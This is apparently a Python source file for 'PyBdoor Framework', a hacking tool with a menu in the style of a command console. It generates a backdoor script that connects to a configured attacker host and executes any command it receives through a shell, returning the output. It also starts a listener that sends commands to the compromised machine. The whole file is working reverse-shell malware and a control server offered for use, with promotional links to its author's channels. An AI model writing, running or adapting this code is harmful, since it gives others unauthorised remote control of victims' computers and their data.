import socket
import time
import sys
import os 

print("")
os.system('cls' if os.name == 'nt' else 'clear')
def banner():
	print('''            
 (                                    
 )\ )        (    (                   
(()/( (    ( )\   )\ )           (    
 /(_)))\ ) )((_) (()/(  (    (   )(   
(_)) (()/(((_)_   ((_)) )\   )\ (()\  
| _ \ )(_))| _ )  _| | ((_) ((_) ((_) 
|  _/| || || _ \/ _` |/ _ \/ _ \| '_| 
|_|   \_, ||___/\__,_|\___/\___/|_|   
      |__/                             
      PyBdoor Framework''')
	print("")
	print("Copyright : ph4mch13n")
	print("Twitter : @Anonym0us_VNPC")
	print("Tele : https://t.me/Anon0psNews")
	print("Github : /Phamchie")
	print('''
============================================
| command                 options          |
============================================  
| set lhost        set ip system attack    |
| set lport        set port system attack  |
|                                          |
| set rhost        set ip victim           |
| set rport        set port victim         |
|                                          |
| set filename     Created File Backdoor   |
|                                          |
| options          show options            |
| help             helping for tools       |
| exploit          run exploit victim      |
============================================''')

banner()

print("")
print("type help")
print("")

lhost = '127.0.0.1'
lport = '4444'

rhost = '127.0.0.1'
rport = '4444'

filename = 'null'

session = True
while session:
	text_main = input("pybdoor(backdoor) > ")

	if text_main == "help":
		print("")
		print('''
============================================
| command                 options          |
============================================  
| set lhost        set ip system attack    |
| set lport        set port system attack  |
|                                          |
| set rhost        set ip victim           |
| set rport        set port victim         |
|                                          |
| set filename     Created File Backdoor   |
|                                          |
| options          show options            |
| help             helping for tools       |
| exploit          run exploit victim      |
============================================
''')
		print("")

	elif text_main == "set lhost":
		print("")
		lhost = input("LHOST : ")
		print("")
		print(f"[*] set LHOST : {lhost}")
		print("")

	elif text_main == "set lport":
		print("")
		lport = input("LPORT : ")
		print("")
		print(f"[*] set LPORT : {lport}")
		print("")

	elif text_main == "set rhost":
		print("")
		rhost = input("RHOST : ")
		print("")
		print(f"[*] set RHOST : {rhost}")
		print("")

	elif text_main == "set rport":
		print("")
		rport = input("RPORT : ")
		print("")
		print(f"[*] set RPORT : {rport}")
		print("")



	elif text_main == "set filename":
		print("")
		filename = input("File Name : ")
		print("")
		code = f'''
import socket
import subprocess
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')

ip = '{rhost}'
port = {rport}

s = socket.socket(socket.AF_INET, 
	socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, 
	socket.SO_REUSEADDR, 
	1)

s.connect((ip, 
	port))

print('[+] Starting Setup Bottom...')

while True:
	cmd = s.recv(1024)
	if cmd == b'exit':
		print("[+] Session Close")
		s.close()
		break

	elif cmd == b'system_info':

		s.send(b'uname -a')

	else:
		proc = subprocess.Popen(cmd, 
			shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
			stdin=subprocess.PIPE)

		output = proc.stdout.read() + proc.stderr.read()
		
		s.send(output)
		'''

		with open(f'{filename}.py', 'w') as file:
			file.write(code)

		print(f"[*] set filename {filename}.py")

		print("")

	elif text_main == "options":
		print(f'''
======================================
| options | IP              | PORT   |   
|=====================================
| LHOST   : {lhost}         {lport}
| RHOST   : {rhost}         {rport}
======================================

=======================
| options |  File name|
=======================
| FILENAME | {filename}.py
=======================
''')

	elif text_main == "exploit":

		import socket
		import sys

		IP = f'{lhost}'
		PORT = 4444

		s = socket.socket(socket.AF_INET,
			socket.SOCK_STREAM)

		s.setsockopt(socket.SOL_SOCKET, 
			socket.SO_REUSEADDR, 
			1)

		s.bind((IP, PORT))
		s.listen(1)


		print("")
		print(f'[+] Starting Reverse Handler On {rhost}:{rport}')
		time.sleep(2)
		print('[*] Startingthe payload backdoor...')
		time.sleep(1)
		print('[*] Server is listening on '+ str(rhost) + ":" + str(rport) + '...')
		conn, addr = s.accept()
		print('[+] Connected Done From ', addr)
		time.sleep(2)
		print("[+] Join Us : https://t.me/Anon0psNews/")
		time.sleep(1)
		print("[+] session started...")

		session_door = True

		while True:

		      sys.stdout.write(f"\n{rhost}(meterpreter) > ")
		      command = sys.stdin.readline()

		      if command == 'exit\n':
		          print('[+] Close')
		          conn.send(b"exit")
		          conn.close()
		          break  

		      elif command == 'system_info\n':
		      	usr = conn.send(b'uname -o')

		      elif command != '\n':
		          conn.send(command.encode())
		          output = conn.recv(1024)
		          print("\n", output)
